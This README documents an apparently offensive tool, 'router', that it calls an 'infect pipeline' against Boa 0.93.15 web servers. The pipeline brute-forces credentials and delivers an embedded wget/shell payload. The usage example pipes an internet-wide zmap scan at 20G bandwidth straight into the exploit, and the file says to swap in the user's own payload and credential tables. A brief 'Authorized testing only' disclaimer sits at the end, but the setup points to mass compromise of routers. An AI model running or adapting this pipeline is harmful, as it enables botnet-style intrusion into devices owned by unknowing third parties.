# router

**Boa 0.93.15**–oriented infect pipeline: credential brute, payload delivery, concurrent stats. Uses `router.lst` as zmap `-w` weight file.

## Files

| File | Role |
|------|------|
| `router.go` | Main exploit |
| `router.lst` | Zmap scan list |
| `tut.txt` | Ubuntu 24 + zmap install notes |

## Example (from tut.txt)

```bash
apt install zmap -y
snap install go --classic
# edit payload in router.go
zmap -p 80 -r 0 -B 20G -w router.lst | go run router.go 80
```

Use port `8080` as second argument if scanning alternate HTTP port.

## Configuration

Replace embedded wget/shell payload and credential tables in `router.go`.

## Disclaimer

Authorized testing only.
